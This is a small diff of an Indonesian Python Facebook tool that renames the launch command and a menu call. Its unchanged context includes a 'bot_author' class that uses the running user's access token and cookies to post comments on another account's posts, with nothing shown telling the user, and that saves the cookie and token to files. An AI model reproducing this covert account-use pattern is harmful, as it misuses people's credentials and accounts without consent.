@@ -112,7 +112,7 @@ def kecuali(error):
     print('       %s• %sBug Pada Requests'%(M,A))
     print('       %s• %sDan Lain-Lain\n'%(M,A))
     print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %spython sakera.py\n'%(M,A))
+    print('       %s• %spython app.py\n'%(M,A))
     exit()
     
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
@@ -143,7 +143,7 @@ class bot_author:
             try:
                 for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                 get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
-                if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
+                if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(app.menu())
             except Exception as e:pass
     def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
         _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
